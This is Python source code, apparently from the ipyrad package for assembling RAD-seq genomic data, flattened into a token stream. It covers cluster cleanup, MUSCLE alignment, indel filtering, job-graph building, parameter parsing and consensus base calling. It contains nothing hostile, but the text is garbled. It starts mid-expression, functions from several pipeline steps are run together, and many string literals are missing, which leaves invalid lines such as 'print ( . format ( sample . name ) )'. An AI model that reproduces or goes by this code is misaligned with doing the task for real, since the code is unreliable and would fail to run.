. array ( depths )
def sample_cleanup ( data , sample ) : ## get maxlen and depths array from clusters maxlens , depths = get_quick_depths ( data , sample ) try : depths . max ( ) except ValueError : ## If depths is an empty array max() will raise print ( "    no clusters found for {}" . format ( sample . name ) ) return ## Test if depths is non-empty, but just full of zeros. if depths . max ( ) : ## store which min was used to calculate hidepth here sample . stats_dfs . s3 [ "hidepth_min" ] = data . paramsdict [ "mindepth_majrule" ] ## If our longest sequence is longer than the current max_fragment_length ## then update max_fragment_length. For assurance we require that ## max len is 4 greater than maxlen, to allow for pair separators. hidepths = depths >= data . paramsdict [ "mindepth_majrule" ] maxlens = maxlens [ hidepths ] ## Handle the case where there are no hidepth clusters if maxlens . any ( ) : maxlen = int ( maxlens . mean ( ) + ( 2. * maxlens . std ( ) ) ) else : maxlen = 0 if maxlen > data . _hackersonly [ "max_fragment_length" ] : data . _hackersonly [ "max_fragment_length" ] = maxlen + 4 ## make sense of stats keepmj = depths [ depths >= data . paramsdict [ "mindepth_majrule" ] ] keepstat = depths [ depths >= data . paramsdict [ "mindepth_statistical" ] ] ## sample summary stat assignments sample . stats [ "state" ] = 3 sample . stats [ "clusters_total" ] = depths . shape [ 0 ] sample . stats [ "clusters_hidepth" ] = keepmj . shape [ 0 ] ## store depths histogram as a dict. Limit to first 25 bins bars , bins = np . histogram ( depths , bins = range ( 1 , 26 ) ) sample . depths = { int ( i ) : v for i , v in zip ( bins , bars ) if v } ## sample stat assignments ## Trap numpy warnings ("mean of empty slice") printed by samples ## with few reads. with warnings . catch_warnings ( ) : warnings . simplefilter ( "ignore" , category = RuntimeWarning ) sample . stats_dfs . s3 [ "merged_pairs" ] = sample . stats . reads_merged sample . stats_dfs . s3 [ "clusters_total" ] = depths . shape [ 0 ] try : sample . stats_dfs . s3 [ "clusters_hidepth" ] = int ( sample . stats [ "clusters_hidepth" ] ) except ValueError : ## Handle clusters_hidepth == NaN sample . stats_dfs . s3 [ "clusters_hidepth" ] = 0 sample . stats_dfs . s3 [ "avg_depth_total" ] = depths . mean ( ) LOGGER . debug ( "total depth {}" . format ( sample . stats_dfs . s3 [ "avg_depth_total" ] ) ) sample . stats_dfs . s3 [ "avg_depth_mj" ] = keepmj . mean ( ) LOGGER . debug ( "mj depth {}" . format ( sample . stats_dfs . s3 [ "avg_depth_mj" ] ) ) sample . stats_dfs . s3 [ "avg_depth_stat" ] = keepstat . mean ( ) sample . stats_dfs . s3 [ "sd_depth_total" ] = depths . std ( ) sample . stats_dfs . s3 [ "sd_depth_mj" ] = keepmj . std ( ) sample . stats_dfs . s3 [ "sd_depth_stat" ] = keepstat . std ( ) else : print ( "    no clusters found for {}" . format ( sample . name ) ) ## Get some stats from the bam files ## This is moderately hackish. samtools flagstat returns ## the number of reads in the bam file as the first element ## of the first line, this call makes this assumption. if not data . paramsdict [ "assembly_method" ] == "denovo" : refmap_stats ( data , sample ) log_level = logging . getLevelName ( LOGGER . getEffectiveLevel ( ) ) if not log_level == "DEBUG" : ## Clean up loose files only if not in DEBUG ##- edits/*derep, utemp, *utemp.sort, *htemp, *clust.gz derepfile = os . path . join ( data . dirs . edits , sample . name + "_derep.fastq" ) mergefile = os . path . join ( data . dirs . edits , sample . name + "_merged_.fastq" ) uhandle = os . path . join ( data . dirs . clusts , sample . name + ".utemp" ) usort = os . path . join ( data . dirs . clusts , sample . name + ".utemp.sort" ) hhandle = os . path . join ( data . dirs . clusts , sample . name + ".htemp" ) clusters = os . path . join ( data . dirs . clusts , sample . name + ".clust.gz" ) for f in [ derepfile , mergefile , uhandle , usort , hhandle , clusters ] : try : os . remove ( f ) except : pass
def persistent_popen_align3 ( clusts , maxseqs = 200 , is_gbs = False ) : ## create a separate shell for running muscle in, this is much faster ## than spawning a separate subprocess for each muscle call proc = sps . Popen ( [ "bash" ] , stdin = sps . PIPE , stdout = sps . PIPE , universal_newlines = True ) ## iterate over clusters in this file until finished aligned = [ ] for clust in clusts : ## new alignment string for read1s and read2s align1 = "" align2 = "" ## don't bother aligning if only one seq if clust . count ( ">" ) == 1 : aligned . append ( clust . replace ( ">" , "" ) . strip ( ) ) else : ## do we need to split the alignment? (is there a PE insert?) try : ## make into list (only read maxseqs lines, 2X cuz names) lclust = clust . split ( ) [ : maxseqs * 2 ] ## try to split cluster list at nnnn separator for each read lclust1 = list ( itertools . chain ( * zip ( lclust [ : : 2 ] , [ i . split ( "nnnn" ) [ 0 ] for i in lclust [ 1 : : 2 ] ] ) ) ) lclust2 = list ( itertools . chain ( * zip ( lclust [ : : 2 ] , [ i . split ( "nnnn" ) [ 1 ] for i in lclust [ 1 : : 2 ] ] ) ) ) ## put back into strings clust1 = "\n" . join ( lclust1 ) clust2 = "\n" . join ( lclust2 ) ## Align the first reads. ## The muscle command with alignment as stdin and // as splitter cmd1 = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( clust1 , ipyrad . bins . muscle , "//" ) ## send cmd1 to the bash shell print ( cmd1 , file = proc . stdin ) ## read the stdout by line until splitter is reached ## meaning that the alignment is finished. for line in iter ( proc . stdout . readline , '//\n' ) : align1 += line ## Align the second reads. ## The muscle command with alignment as stdin and // as splitter cmd2 = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( clust2 , ipyrad . bins . muscle , "//" ) ## send cmd2 to the bash shell print ( cmd2 , file = proc . stdin ) ## read the stdout by line until splitter is reached ## meaning that the alignment is finished. for line in iter ( proc . stdout . readline , '//\n' ) : align2 += line ## join up aligned read1 and read2 and ensure names order matches la1 = align1 [ 1 : ] . split ( "\n>" ) la2 = align2 [ 1 : ] . split ( "\n>" ) dalign1 = dict ( [ i . split ( "\n" , 1 ) for i in la1 ] ) dalign2 = dict ( [ i . split ( "\n" , 1 ) for i in la2 ] ) align1 = [ ] try : keys = sorted ( dalign1 . keys ( ) , key = DEREP , reverse = True ) except ValueError as inst : ## Lines is empty. This means the call to muscle alignment failed. ## Not sure how to handle this, but it happens only very rarely. LOGGER . error ( "Muscle alignment failed: Bad clust - {}\nBad lines - {}" . format ( clust , lines ) ) continue ## put seed at top of alignment seed = [ i for i in keys if i . split ( ";" ) [ - 1 ] [ 0 ] == "*" ] [ 0 ] keys . pop ( keys . index ( seed ) ) keys = [ seed ] + keys for key in keys : align1 . append ( "\n" . join ( [ key , dalign1 [ key ] . replace ( "\n" , "" ) + "nnnn" + dalign2 [ key ] . replace ( "\n" , "" ) ] ) ) ## append aligned cluster string aligned . append ( "\n" . join ( align1 ) . strip ( ) ) ## Malformed clust. Dictionary creation with only 1 element will raise. except ValueError as inst : LOGGER . debug ( "Bad PE cluster - {}\nla1 - {}\nla2 - {}" . format ( clust , la1 , la2 ) ) ## Either reads are SE, or at least some pairs are merged. except IndexError : ## limit the number of input seqs lclust = "\n" . join ( clust . split ( ) [ : maxseqs * 2 ] ) ## the muscle command with alignment as stdin and // as splitter cmd = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( lclust , ipyrad . bins . muscle , "//" ) ## send cmd to the bash shell (TODO: PIPE could overflow here!) print ( cmd , file = proc . stdin ) ## read the stdout by line until // is reached. This BLOCKS. for line in iter ( proc . stdout . readline , '//\n' ) : align1 += line ## remove '>' from names, and '\n' from inside long seqs                 lines = align1 [ 1 : ] . split ( "\n>" ) try : ## find seed of the cluster and put it on top. seed = [ i for i in lines if i . split ( ";" ) [ - 1 ] [ 0 ] == "*" ] [ 0 ] lines . pop ( lines . index ( seed ) ) lines = [ seed ] + sorted ( lines , key = DEREP , reverse = True ) except ValueError as inst : ## Lines is empty. This means the call to muscle alignment failed. ## Not sure how to handle this, but it happens only very rarely. LOGGER . error ( "Muscle alignment failed: Bad clust - {}\nBad lines - {}" . format ( clust , lines ) ) continue ## format remove extra newlines from muscle aa = [ i . split ( "\n" , 1 ) for i in lines ] align1 = [ i [ 0 ] + '\n' + "" . join ( [ j . replace ( "\n" , "" ) for j in i [ 1 : ] ] ) for i in aa ] ## trim edges in sloppy gbs/ezrad data. Maybe relevant to other types too... if is_gbs : align1 = gbs_trim ( align1 ) ## append to aligned aligned . append ( "\n" . join ( align1 ) . strip ( ) ) # cleanup proc . stdout . close ( ) if proc . stderr : proc . stderr . close ( ) proc . stdin . close ( ) proc . wait ( ) ## return the aligned clusters return aligned
def align_and_parse ( handle , max_internal_indels = 5 , is_gbs = False ) : ## data are already chunked, read in the whole thing. bail if no data. try : with open ( handle , 'rb' ) as infile : clusts = infile . read ( ) . split ( "//\n//\n" ) ## remove any empty spots clusts = [ i for i in clusts if i ] ## Skip entirely empty chunks if not clusts : raise IPyradError except ( IOError , IPyradError ) : LOGGER . debug ( "skipping empty chunk - {}" . format ( handle ) ) return 0 ## count discarded clusters for printing to stats later highindels = 0 ## iterate over clusters sending each to muscle, splits and aligns pairs try : aligned = persistent_popen_align3 ( clusts , 200 , is_gbs ) except Exception as inst : LOGGER . debug ( "Error in handle - {} - {}" . format ( handle , inst ) ) #raise IPyradWarningExit("error hrere {}".format(inst)) aligned = [ ] ## store good alignments to be written to file refined = [ ] ## filter and trim alignments for clust in aligned : ## check for too many internal indels filtered = aligned_indel_filter ( clust , max_internal_indels ) ## reverse complement matches. No longer implemented. #filtered = overshoot_filter(clust) ## finally, add to outstack if alignment is good if not filtered : refined . append ( clust ) #"\n".join(stack)) else : highindels += 1 ## write to file after if refined : outhandle = handle . rsplit ( "." , 1 ) [ 0 ] + ".aligned" with open ( outhandle , 'wb' ) as outfile : outfile . write ( "\n//\n//\n" . join ( refined ) + "\n" ) ## remove the old tmp file log_level = logging . getLevelName ( LOGGER . getEffectiveLevel ( ) ) if not log_level == "DEBUG" : os . remove ( handle ) return highindels
def aligned_indel_filter ( clust , max_internal_indels ) : ## make into list lclust = clust . split ( ) ## paired or not try : seq1 = [ i . split ( "nnnn" ) [ 0 ] for i in lclust [ 1 : : 2 ] ] seq2 = [ i . split ( "nnnn" ) [ 1 ] for i in lclust [ 1 : : 2 ] ] intindels1 = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq1 ] intindels2 = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq2 ] intindels = intindels1 + intindels2 if max ( intindels ) > max_internal_indels : return 1 except IndexError : seq1 = lclust [ 1 : : 2 ] intindels = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq1 ] if max ( intindels ) > max_internal_indels : return 1 return 0
def setup_dirs ( data ) : ## make output folder for clusters pdir = os . path . realpath ( data . paramsdict [ "project_dir" ] ) data . dirs . clusts = os . path . join ( pdir , "{}_clust_{}" . format ( data . name , data . paramsdict [ "clust_threshold" ] ) ) if not os . path . exists ( data . dirs . clusts ) : os . mkdir ( data . dirs . clusts ) ## make a tmpdir for align files data . tmpdir = os . path . abspath ( os . path . expanduser ( os . path . join ( pdir , data . name + '-tmpalign' ) ) ) if not os . path . exists ( data . tmpdir ) : os . mkdir ( data . tmpdir ) ## If ref mapping, init samples and make the refmapping output directory. if not data . paramsdict [ "assembly_method" ] == "denovo" : ## make output directory for read mapping process data . dirs . refmapping = os . path . join ( pdir , "{}_refmapping" . format ( data . name ) ) if not os . path . exists ( data . dirs . refmapping ) : os . mkdir ( data . dirs . refmapping )
def build_dag ( data , samples ) : ## Create DAGs for the assembly method being used, store jobs in nodes snames = [ i . name for i in samples ] dag = nx . DiGraph ( ) ## get list of pre-align jobs from globals based on assembly method joborder = JOBORDER [ data . paramsdict [ "assembly_method" ] ] ## WHICH JOBS TO RUN: iterate over the sample names for sname in snames : ## append pre-align job for each sample to nodes list for func in joborder : dag . add_node ( "{}-{}-{}" . format ( func , 0 , sname ) ) ## append align func jobs, each will have max 10 for chunk in xrange ( 10 ) : dag . add_node ( "{}-{}-{}" . format ( "muscle_align" , chunk , sname ) ) ## append final reconcat jobs dag . add_node ( "{}-{}-{}" . format ( "reconcat" , 0 , sname ) ) ## ORDER OF JOBS: add edges/dependency between jobs: (first-this, then-that) for sname in snames : for sname2 in snames : ## enforce that clust/map cannot start until derep is done for ALL ## samples. This is b/c... dag . add_edge ( "{}-{}-{}" . format ( joborder [ 0 ] , 0 , sname2 ) , "{}-{}-{}" . format ( joborder [ 1 ] , 0 , sname ) ) ## add remaining pre-align jobs  for idx in xrange ( 2 , len ( joborder ) ) : dag . add_edge ( "{}-{}-{}" . format ( joborder [ idx - 1 ] , 0 , sname ) , "{}-{}-{}" . format ( joborder [ idx ] , 0 , sname ) ) ## Add 10 align jobs, none of which can start until all chunker jobs ## are finished. Similarly, reconcat jobs cannot start until all align ## jobs are finished. for sname2 in snames : for chunk in range ( 10 ) : dag . add_edge ( "{}-{}-{}" . format ( "muscle_chunker" , 0 , sname2 ) , "{}-{}-{}" . format ( "muscle_align" , chunk , sname ) ) ## add that the final reconcat job can't start until after ## each chunk of its own sample has finished aligning. dag . add_edge ( "{}-{}-{}" . format ( "muscle_align" , chunk , sname ) , "{}-{}-{}" . format ( "reconcat" , 0 , sname ) ) ## return the dag return dag , joborder
def _plot_dag ( dag , results , snames ) : try : import matplotlib . pyplot as plt from matplotlib . dates import date2num from matplotlib . cm import gist_rainbow ## first figure is dag layout plt . figure ( "dag_layout" , figsize = ( 10 , 10 ) ) nx . draw ( dag , pos = nx . spring_layout ( dag ) , node_color = 'pink' , with_labels = True ) plt . savefig ( "./dag_layout.png" , bbox_inches = 'tight' , dpi = 200 ) ## second figure is times for steps pos = { } colors = { } for node in dag : #jobkey = "{}-{}".format(node, sample) mtd = results [ node ] . metadata start = date2num ( mtd . started ) #runtime = date2num(md.completed)# - start ## sample id to separate samples on x-axis _ , _ , sname = node . split ( "-" , 2 ) sid = snames . index ( sname ) ## 1e6 to separate on y-axis pos [ node ] = ( start + sid , start * 1e6 ) colors [ node ] = mtd . engine_id ## x just spaces out samples; ## y is start time of each job with edge leading to next job ## color is the engine that ran the job ## all jobs were submitted as 3 second wait times plt . figure ( "dag_starttimes" , figsize = ( 10 , 16 ) ) nx . draw ( dag , pos , node_list = colors . keys ( ) , node_color = colors . values ( ) , cmap = gist_rainbow , with_labels = True ) plt . savefig ( "./dag_starttimes.png" , bbox_inches = 'tight' , dpi = 200 ) except Exception as inst : LOGGER . warning ( inst )
def run ( data , samples , noreverse , maxindels , force , ipyclient ) : ## list of samples to submit to queue subsamples = [ ] ## if sample is already done skip for sample in samples : ## If sample not in state 2 don't try to cluster it. if sample . stats . state < 2 : print ( . format ( sample . name ) ) continue if not force : if sample . stats . state >= 3 : print ( . format ( sample . name ) ) else : if sample . stats . reads_passed_filter : subsamples . append ( sample ) else : ## force to overwrite if sample . stats . reads_passed_filter : subsamples . append ( sample ) ## run subsamples if not subsamples : print ( "  No Samples ready to be clustered. First run step2()." ) else : ## arguments to apply_jobs, inst catches exceptions try : ## make dirs that are needed including tmpdir setup_dirs ( data ) ## if refmapping make filehandles that will be persistent if not data . paramsdict [ "assembly_method" ] == "denovo" : for sample in subsamples : refmap_init ( data , sample , force ) ## set thread-count to 2 for paired-data nthreads = 2 ## set thread-count to 1 for single-end data           else : nthreads = 1 ## overwrite nthreads if value in _ipcluster dict if "threads" in data . _ipcluster . keys ( ) : nthreads = int ( data . _ipcluster [ "threads" ] ) ## if more CPUs than there are samples then increase threads _ncpus = len ( ipyclient ) if _ncpus > 2 * len ( data . samples ) : nthreads *= 2 ## submit jobs to be run on cluster args = [ data , subsamples , ipyclient , nthreads , maxindels , force ] new_apply_jobs ( * args ) finally : ## this can fail if jobs were not stopped properly and are still ## writing to tmpdir. don't cleanup if debug is on. try : log_level = logging . getLevelName ( LOGGER . getEffectiveLevel ( ) ) if not log_level == "DEBUG" : if os . path . exists ( data . tmpdir ) : shutil . rmtree ( data . tmpdir ) ## get all refmap_derep.fastqs rdereps = glob . glob ( os . path . join ( data . dirs . edits , "*-refmap_derep.fastq" ) ) ## Remove the unmapped fastq files for rmfile in rdereps : os . remove ( rmfile ) except Exception as _ : LOGGER . warning ( "failed to cleanup files/dirs" )
def parse_params ( args ) : ## check that params.txt file is correctly formatted. try : with open ( args . params ) as paramsin : plines = paramsin . readlines ( ) except IOError as _ : sys . exit ( "  No params file found" ) ## check header: big version changes can be distinguished by the header legacy_version = 0 try : ## try to update the Assembly ... legacy_version = 1 if not len ( plines [ 0 ] . split ( ) [ 0 ] ) == 7 : raise IPyradWarningExit ( . format ( args . params , ip . __version__ ) ) except IndexError : raise IPyradWarningExit ( . format ( args . params ) ) ## update and backup if legacy_version : #which version... #update_to_6() pass ## make into a dict. Ignore blank lines at the end of file ## Really this will ignore all blank lines items = [ i . split ( "##" ) [ 0 ] . strip ( ) for i in plines [ 1 : ] if not i . strip ( ) == "" ] #keys = [i.split("]")[-2][-1] for i in plines[1:]] #keys = range(len(plines)-1) keys = ip . Assembly ( 'null' , quiet = True ) . paramsdict . keys ( ) parsedict = { str ( i ) : j for i , j in zip ( keys , items ) } return parsedict
def showstats ( parsedict ) : #project_dir = parsedict['1'] project_dir = parsedict [ "project_dir" ] if not project_dir : project_dir = "./" ## Be nice if somebody also puts in the file extension #assembly_name = parsedict['0'] assembly_name = parsedict [ "assembly_name" ] my_assembly = os . path . join ( project_dir , assembly_name ) ## If the project_dir doesn't exist don't even bother trying harder. if not os . path . isdir ( project_dir ) : msg = . format ( project_dir ) sys . exit ( msg ) if not assembly_name : msg = . format ( project_dir ) raise IPyradError ( msg ) data = ip . load_json ( my_assembly , quiet = True , cli = True ) print ( "\nSummary stats of Assembly {}" . format ( data . name ) + "\n------------------------------------------------" ) if not data . stats . empty : print ( data . stats ) print ( "\n\nFull stats files" + "\n------------------------------------------------" ) fullcurdir = os . path . realpath ( os . path . curdir ) for i in range ( 1 , 8 ) : #enumerate(sorted(data.stats_files)): key = "s" + str ( i ) try : val = data . stats_files [ key ] val = val . replace ( fullcurdir , "." ) print ( "step {}: {}" . format ( i , val ) ) except ( KeyError , AttributeError ) : print ( "step {}: None" . format ( i ) ) print ( "\n" ) else : print ( "No stats to display" )
def _check_version ( ) : import urllib2 from distutils . version import LooseVersion header = "\n -------------------------------------------------------------" + "\n  ipyrad [v.{}]" . format ( ip . __version__ ) + "\n  Interactive assembly and analysis of RAD-seq data" + "\n -------------------------------------------------------------" try : htmldat = urllib2 . urlopen ( "https://anaconda.org/ipyrad/ipyrad" ) . readlines ( ) curversion = next ( ( x for x in htmldat if "subheader" in x ) , None ) . split ( ">" ) [ 1 ] . split ( "<" ) [ 0 ] if LooseVersion ( ip . __version__ ) < LooseVersion ( curversion ) : msg = . format ( curversion ) print ( header + "\n" + msg ) else : pass #print("You are up to date") except Exception as inst : ## Always fail silently pass
def get_binom ( base1 , base2 , estE , estH ) : prior_homo = ( 1. - estH ) / 2. prior_hete = estH ## calculate probs bsum = base1 + base2 hetprob = scipy . misc . comb ( bsum , base1 ) / ( 2. ** ( bsum ) ) homoa = scipy . stats . binom . pmf ( base2 , bsum , estE ) homob = scipy . stats . binom . pmf ( base1 , bsum , estE ) ## calculate probs hetprob *= prior_hete homoa *= prior_homo homob *= prior_homo ## final  probabilities = [ homoa , homob , hetprob ] bestprob = max ( probabilities ) / float ( sum ( probabilities ) ) ## return if hetprob > homoa : return True , bestprob else : return False , bestprob
def newconsensus ( data , sample , tmpchunk , optim ) : ## do reference map funcs? isref = "reference" in data . paramsdict [ "assembly_method" ] ## temporarily store the mean estimates to Assembly data . _este = data . stats . error_est . mean ( ) data . _esth = data . stats . hetero_est . mean ( ) ## get number relative to tmp file tmpnum = int ( tmpchunk . split ( "." ) [ - 1 ] ) ## prepare data for reading clusters = open ( tmpchunk , 'rb' ) pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) maxlen = data . _hackersonly [ "max_fragment_length" ] ## write to tmp cons to file to be combined later consenshandle = os . path . join ( data . dirs . consens , sample . name + "_tmpcons." + str ( tmpnum ) ) tmp5 = consenshandle . replace ( "_tmpcons." , "_tmpcats." ) with h5py . File ( tmp5 , 'w' ) as io5 : io5 . create_dataset ( "cats" , ( optim , maxlen , 4 ) , dtype = np . uint32 ) io5 . create_dataset ( "alls" , ( optim , ) , dtype = np . uint8 ) io5 . create_dataset ( "chroms" , ( optim , 3 ) , dtype = np . int64 ) ## local copies to use to fill the arrays catarr = io5 [ "cats" ] [ : ] nallel = io5 [ "alls" ] [ : ] refarr = io5 [ "chroms" ] [ : ] ## if reference-mapped then parse the fai to get index number of chroms if isref : fai = pd . read_csv ( data . paramsdict [ "reference_sequence" ] + ".fai" , names = [ 'scaffold' , 'size' , 'sumsize' , 'a' , 'b' ] , sep = "\t" ) faidict = { j : i for i , j in enumerate ( fai . scaffold ) } ## store data for stats counters counters = { "name" : tmpnum , "heteros" : 0 , "nsites" : 0 , "nconsens" : 0 } ## store data for what got filtered filters = { "depth" : 0 , "maxh" : 0 , "maxn" : 0 } ## store data for writing storeseq = { } ## set max limits if 'pair' in data . paramsdict [ "datatype" ] : maxhet = sum ( data . paramsdict [ "max_Hs_consens" ] ) maxn = sum ( data . paramsdict [ "max_Ns_consens" ] ) else : maxhet = data . paramsdict [ "max_Hs_consens" ] [ 0 ] maxn = data . paramsdict [ "max_Ns_consens" ] [ 0 ] ## load the refmap dictionary if refmapping done = 0 while not done : try : done , chunk = clustdealer ( pairdealer , 1 ) except IndexError : raise IPyradError ( "clustfile formatting error in %s" , chunk ) if chunk : ## get names and seqs piece = chunk [ 0 ] . strip ( ) . split ( "\n" ) names = piece [ 0 : : 2 ] seqs = piece [ 1 : : 2 ] ## pull replicate read info from seqs reps = [ int ( sname . split ( ";" ) [ - 2 ] [ 5 : ] ) for sname in names ] ## IF this is a reference mapped read store the chrom and pos info ## -1 defaults to indicating an anonymous locus, since we are using ## the faidict as 0 indexed. If chrompos fails it defaults to -1 ref_position = ( - 1 , 0 , 0 ) if isref : try : ## parse position from name string name , _ , _ = names [ 0 ] . rsplit ( ";" , 2 ) chrom , pos0 , pos1 = name . rsplit ( ":" , 2 ) ## pull idx from .fai reference dict  chromint = faidict [ chrom ] + 1 ref_position = ( int ( chromint ) , int ( pos0 ) , int ( pos1 ) ) except Exception as inst : LOGGER . debug ( "Reference sequence chrom/pos failed for {}" . format ( names [ 0 ] ) ) LOGGER . debug ( inst ) ## apply read depth filter if nfilter1 ( data , reps ) : ## get stacks of base counts sseqs = [ list ( seq ) for seq in seqs ] arrayed = np . concatenate ( [ [ seq ] * rep for seq , rep in zip ( sseqs , reps ) ] ) arrayed = arrayed [ : , : maxlen ] ## get consens call for each site, applies paralog-x-site filter #consens = np.apply_along_axis(basecall, 0, arrayed, data) consens = basecaller ( arrayed , data . paramsdict [ "mindepth_majrule" ] , data . paramsdict [ "mindepth_statistical" ] , data . _esth , data . _este , ) ## apply a filter to remove low coverage sites/Ns that ## are likely sequence repeat errors. This is only applied to ## clusters that already passed the read-depth filter (1) if "N" in consens : try : consens , arrayed = removerepeats ( consens , arrayed ) except ValueError as _ : LOGGER . info ( "Caught a bad chunk w/ all Ns. Skip it." ) continue ## get hetero sites hidx = [ i for ( i , j ) in enumerate ( consens ) if j in list ( "RKSYWM" ) ] nheteros = len ( hidx ) ## filter for max number of hetero sites if nfilter2 ( nheteros , maxhet ) : ## filter for maxN, & minlen if nfilter3 ( consens , maxn ) : ## counter right now current = counters [ "nconsens" ] ## get N alleles and get lower case in consens consens , nhaps = nfilter4 ( consens , hidx , arrayed ) ## store the number of alleles observed nallel [ current ] = nhaps ## store a reduced array with only CATG catg = np . array ( [ np . sum ( arrayed == i , axis = 0 ) for i in list ( "CATG" ) ] , dtype = 'uint32' ) . T catarr [ current , : catg . shape [ 0 ] , : ] = catg refarr [ current ] = ref_position ## store the seqdata for tmpchunk storeseq [ counters [ "name" ] ] = "" . join ( list ( consens ) ) counters [ "name" ] += 1 counters [ "nconsens" ] += 1 counters [ "heteros" ] += nheteros else : #LOGGER.debug("@haplo") filters [ 'maxn' ] += 1 else : #LOGGER.debug("@hetero") filters [ 'maxh' ] += 1 else : #LOGGER.debug("@depth") filters [ 'depth' ] += 1 ## close infile io clusters . close ( ) ## write final consens string chunk if storeseq : with open ( consenshandle , 'wb' ) as outfile : outfile . write ( "\n" . join ( [ ">" + sample . name + "_" + str ( key ) + "\n" + str ( storeseq [ key ] ) for key in storeseq ] ) ) ## write to h5 array, this can be a bit slow on big data sets and is not  ## currently convered by progressbar movement. with h5py . File ( tmp5 , 'a' ) as io5 : io5 [ "cats" ] [ : ] = catarr io5 [ "alls" ] [ : ] = nallel io5 [ "chroms" ] [ : ] = refarr del catarr del nallel del refarr ## return stats counters [ 'nsites' ] = sum ( [ len ( i ) for i in storeseq . itervalues ( ) ] ) return counters , filters
def basecaller ( arrayed , mindepth_majrule , mindepth_statistical , estH , estE ) : ## an array to fill with consensus site calls cons = np . zeros ( arrayed . shape [ 1 ] , dtype = np . uint8 ) cons . fill ( 78 ) arr = arrayed . view ( np . uint8 ) ## iterate over columns for col in xrange ( arr . shape [ 1 ] ) : ## the site of focus carr = arr [ : , col ] ## make mask of N and - sites mask = carr == 45 mask += carr == 78 marr = carr [ ~ mask ] ## skip if only empties (e.g., N-) if not marr . shape [ 0 ] : cons [ col ] = 78 ## skip if not variable elif np . all ( marr == marr [ 0 ] ) : cons [ col ] = marr [ 0 ] ## estimate variable site call else : ## get allele freqs (first-most, second, third = p, q, r) counts = np . bincount ( marr ) pbase = np . argmax ( counts ) nump = counts [ pbase ] counts [ pbase ] = 0 qbase = np . argmax ( counts ) numq = counts [ qbase ] counts [ qbase ] = 0 rbase = np . argmax ( counts ) numr = counts [ rbase ] ## based on biallelic depth bidepth = nump + numq if bidepth < mindepth_majrule : cons [ col ] = 78 else : ## if depth is too high, reduce to sampled int if bidepth > 500 : base1 = int ( 500 * ( nump / float ( bidepth ) ) ) base2 = int ( 500 * ( numq / float ( bidepth ) ) ) else : base1 = nump base2 = numq ## make statistical base call   if bidepth >= mindepth_statistical : ishet , prob = get_binom ( base1 , base2 , estE , estH ) #LOGGER.info("ishet, prob, b1, b2: %s %s %s %s", ishet, prob, base1, base2) if prob < 0.95 : cons [ col ] = 78 else : if ishet : cons [ col ] = TRANS [ ( pbase , qbase ) ] else : cons [ col ] = pbase ## make majrule base call else : #if bidepth >= mindepth_majrule: if nump == numq : cons [ col ] = TRANS [ ( pbase , qbase ) ] else : cons [ col ] = pbase return cons . view ( "S1" )
def nfilter1 ( data , reps ) : if sum ( reps ) >= data . paramsdict [ "mindepth_majrule" ] and sum ( reps ) <= data . paramsdict [ "maxdepth" ] : return 1 else : return 0
def nfilter4 ( consens , hidx , arrayed ) : ## if less than two Hs then there is only one allele if len ( hidx ) < 2 : return consens , 1 ## store base calls for hetero sites harray = arrayed [ : , hidx ] ## remove any reads that have N or - base calls at hetero sites ## these cannot be used when calling alleles currently. harray = harray [ ~ np . any ( harray == "-" , axis = 1 ) ] harray = harray [ ~ np . any ( harray == "N" , axis = 1 ) ] ## get counts of each allele (e.g., AT:2, CG:2) ccx = Counter ( [ tuple ( i ) for i in harray ] ) ## Two possibilities we would like to distinguish, but we can't. Therefore, ## we just throw away low depth third alleles that are within seq. error. ## 1) a third base came up as a sequencing error but is not a unique allele ## 2) a third or more unique allele is there but at low frequency ## remove low freq alleles if more than 2, since they may reflect ## sequencing errors at hetero sites, making a third allele, or a new ## allelic combination that is not real. if len ( ccx ) > 2 : totdepth = harray . shape [ 0 ] cutoff = max ( 1 , totdepth // 10 ) alleles = [ i for i in ccx if ccx [ i ] > cutoff ] else : alleles = ccx . keys ( ) ## how many high depth alleles? nalleles = len ( alleles ) ## if 2 alleles then save the phase using lowercase coding if nalleles == 2 : try : consens = storealleles ( consens , hidx , alleles ) except ( IndexError , KeyError ) : ## the H sites do not form good alleles LOGGER . info ( "failed at phasing loc, skipping" ) LOGGER . info ( , consens , hidx , alleles ) return consens , nalleles ## just return the info for later filtering else : return consens , nalleles
def storealleles ( consens , hidx , alleles ) : ## find the first hetero site and choose the priority base ## example, if W: then priority base in A and not T. PRIORITY=(order: CATG) bigbase = PRIORITY [ consens [ hidx [ 0 ] ] ] ## find which allele has priority based on bigbase bigallele = [ i for i in alleles if i [ 0 ] == bigbase ] [ 0 ] ## uplow other bases relative to this one and the priority list ## e.g., if there are two hetero sites (WY) and the two alleles are ## AT and TC, then since bigbase of (W) is A second hetero site should ## be stored as y, since the ordering is swapped in this case; the priority ## base (C versus T) is C, but C goes with the minor base at h site 1. #consens = list(consens) for hsite , pbase in zip ( hidx [ 1 : ] , bigallele [ 1 : ] ) : if PRIORITY [ consens [ hsite ] ] != pbase : consens [ hsite ] = consens [ hsite ] . lower ( ) ## return consens return consens
def chunk_clusters ( data , sample ) : ## counter for split job submission num = 0 ## set optim size for chunks in N clusters. The first few chunks take longer ## because they contain larger clusters, so we create 4X as many chunks as ## processors so that they are split more evenly. optim = int ( ( sample . stats . clusters_total // data . cpus ) + ( sample . stats . clusters_total % data . cpus ) ) ## break up the file into smaller tmp files for each engine ## chunking by cluster is a bit trickier than chunking by N lines chunkslist = [ ] ## open to clusters with gzip . open ( sample . files . clusters , 'rb' ) as clusters : ## create iterator to sample 2 lines at a time pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) ## Use iterator to sample til end of cluster done = 0 while not done : ## grab optim clusters and write to file. done , chunk = clustdealer ( pairdealer , optim ) chunkhandle = os . path . join ( data . dirs . clusts , "tmp_" + str ( sample . name ) + "." + str ( num * optim ) ) if chunk : chunkslist . append ( ( optim , chunkhandle ) ) with open ( chunkhandle , 'wb' ) as outchunk : outchunk . write ( "//\n//\n" . join ( chunk ) + "//\n//\n" ) num += 1 return chunkslist
